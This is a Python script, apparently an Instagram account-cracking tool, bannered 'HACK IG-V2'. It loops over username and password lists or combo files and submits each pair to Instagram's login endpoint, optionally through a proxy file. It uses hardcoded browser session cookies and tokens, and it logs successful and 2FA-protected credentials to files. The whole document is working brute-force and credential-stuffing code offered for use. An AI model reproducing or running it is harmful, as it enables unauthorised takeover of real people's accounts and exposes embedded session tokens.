Black="\033[1;30m"       # Black
Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White
import random
import requests
from time import sleep
bad,done,block,ban=-1,0,0,0
def test_list(username,password):
        global bad,done,block,ban
        Req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '379',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YwFaswALAAGDUIqF4Zv_KkYyK5dy; ig_did=87AF4E9C-A6A1-45EB-9934-7036FDE00AE5; datr=qFsBY4YVOAiwQpifGnwwO1oO; shbid="10011\0543272046838\0541694111575:01f7366bb0a663d7a42a2cc1b628b3d07d49a42bbb67dc1dbe955cd930d60a346a3d703d"; shbts="1662575575\0543272046838\0541694111575:01f7ccb79e8bab04471e2608c7922fbe6fb7b276b2dbb3c7110f7dd5cdd44043bb79086c"; rur="NAO\0543272046838\0541694199569:01f7ab483627fde29c504bd42b02cea174a7dcb4904d5a46fe19eef089388cfb6f0a7790"; csrftoken=LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64 (Edition Campaign 34)',
            'x-asbd-id': '198387',
            'x-csrftoken': 'LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0iSQ98lXvHxKM40b30YUTjBQOI5i1AFNwhXj3bMCuFHShO',
            'x-instagram-ajax': '50d4f75b2921',
            'x-requested-with': 'XMLHttpRequest',
        },data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'stopDeletionNonce': "",
        'trustedDeviceRecords': '{}'
            })
            
        
        if 'errors' in Req.text:
        	block+=1
        if Req.text== '{"message":"","status":"fail"}':
        	block +=1
        if Req.text == '{"user":true,"authenticated":false,"status":"ok"}':
        	bad +=1
        if Req.text == '{"user":false,"authenticated":false,"status":"ok"}':
            bad +=1
        
        if 'userId' in Req.text:
        	done +=1
        	open('done.txt','a').write(username+':'+password+'\n')
        if 'incorrect' in Req.text:
        	bad+=1
        if 'password' in Req.text:
        	ban+=1
        	open('Secure.txt','a').write(username+':'+password+'\n')
        if 'two_factor_required' in Req.text:
        	open('Secure.txt','a').write(username+':'+password+'\n')
        	
        
        
        
        	
        print(f'\r{Green} DONE {done} {White}|{Red} BAD {bad}{White} |{Purple} BLOCK {block} {White}|{Yellow} BAND {ban}',end="")
        sleep(3)
def proxy_list(username,password,proxy):
        global bad,done,block,ban
        proxies={'socks5':f'http://{proxy}','http':f'http://{proxy}','Socks4':f'http://{proxy}',}
        Req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '379',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YwFaswALAAGDUIqF4Zv_KkYyK5dy; ig_did=87AF4E9C-A6A1-45EB-9934-7036FDE00AE5; datr=qFsBY4YVOAiwQpifGnwwO1oO; shbid="10011\0543272046838\0541694111575:01f7366bb0a663d7a42a2cc1b628b3d07d49a42bbb67dc1dbe955cd930d60a346a3d703d"; shbts="1662575575\0543272046838\0541694111575:01f7ccb79e8bab04471e2608c7922fbe6fb7b276b2dbb3c7110f7dd5cdd44043bb79086c"; rur="NAO\0543272046838\0541694199569:01f7ab483627fde29c504bd42b02cea174a7dcb4904d5a46fe19eef089388cfb6f0a7790"; csrftoken=LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64 (Edition Campaign 34)',
            'x-asbd-id': '198387',
            'x-csrftoken': 'LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0iSQ98lXvHxKM40b30YUTjBQOI5i1AFNwhXj3bMCuFHShO',
            'x-instagram-ajax': '50d4f75b2921',
            'x-requested-with': 'XMLHttpRequest',
        },data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'stopDeletionNonce': "",
        'trustedDeviceRecords': '{}'
            },proxies=proxies)
        if 'errors' in Req.text:
        	block+=1
        if Req.text== '{"message":"","status":"fail"}':
        	block +=1
        if Req.text == '{"user":true,"authenticated":false,"status":"ok"}':
        	bad +=1
        if Req.text == '{"user":false,"authenticated":false,"status":"ok"}':
            bad +=1
        
        if 'userId' in Req.text:
        	done +=1
        	open('done.txt','a').write(username+':'+password+'\n')
        if 'incorrect' in Req.text:
        	bad+=1
        if 'password' in Req.text:
        	ban+=1
        	open('Secure.txt','a').write(username+':'+password+'\n')
        if 'two_factor_required' in Req.text:
        	open('Secure.txt','a').write(username+':'+password+'\n')
        	
        
        
        
        	
        print(f'\r{Green} DONE {done} {White}|{Red} BAD {bad}{White} |{Purple} BLOCK {block} {White}|{Yellow} BAND {ban}',end="")
print(f'''
{Yellow}
INSTAGRAM : {Red}FX_PY3
{Yellow}TELEGRAM : {Red}FX_PY

██╗  ██╗ █████╗  ██████╗██╗  ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝
███████║███████║██║     █████╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗ 
██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                
██╗ ██████╗       ██╗   ██╗██████╗ 
██║██╔════╝       ██║   ██║╚════██╗
██║██║  ███╗█████╗██║   ██║ █████╔╝
██║██║   ██║╚════╝╚██╗ ██╔╝██╔═══╝ 
██║╚██████╔╝       ╚████╔╝ ███████╗
╚═╝ ╚═════╝         ╚═══╝  ╚══════╝{White}
==================================
{Red}[{White}1{Red}]{Yellow} - user & pass file
{Red}[{White}2{Red}]{Yellow} - pass & user's file
{Red}[{White}3{Red}]{Yellow} - combo file 
{Red}[{White}4{Red}]{Yellow} - user & pass file >>> proxy
{Red}[{White}5{Red}]{Yellow} - pass & user's file >>> proxy
{Red}[{White}6{Red}]{Yellow} - combo file  >>> proxy {White}
==================================

''')
_=f'{Yellow}[{White}+{Yellow}]{White} - '
try :
	c=int(input(_+' Choose : '))
except :
	print('[X] Enter numper [X]')
	exit() 
i=0
if c == 1:
	username =input(_+' Enter User : ')
	file = input(_+" Enter Password File : ")
	print('\n\n')
	for password in open(file,'r').read().splitlines(): 
		test_list(username,password)
elif c == 2:
	password =input(_+' Enter password : ')
	file = input(_+" Enter user File : ")
	print('\n\n')
	for username in open(file,'r').read().splitlines(): 
		test_list(username,password)
if c == 4:
	username =input(_+' Enter User : ')
	file = input(_+" Enter Password File : ")
	prox = input(_+" Enter proxy File : ")
	print('\n\n')
	for password in open(file,'r').read().splitlines():
		proxy=open(prox,'r').readline()		
		proxy_list(username,password,proxy)		
elif c == 5:		
	password =input(_+' Enter password : ')
	file = input(_+" Enter user File : ")
	prox = input(_+" Enter proxy File : ")
	print('\n\n')
	for username in open(file,'r').read().splitlines(): 
		proxy=open(prox,'r').readline()		
		proxy_list(username,password,proxy)
elif c == 3:	
	file = input(_+" Enter Combo File : ")
	print('\n\n')
	for combo in open(file,'r').read().splitlines(): 
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		test_list(username,password)
elif c == 6:		
	file = input(_+" Enter Combo File : ")
	prox = input(_+" Enter proxy File : ")
	print('\n\n')
	for combo in open(file,'r').read().splitlines(): 
		proxy=open(prox,'r').readline()
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		proxy_list(username,password,proxy)
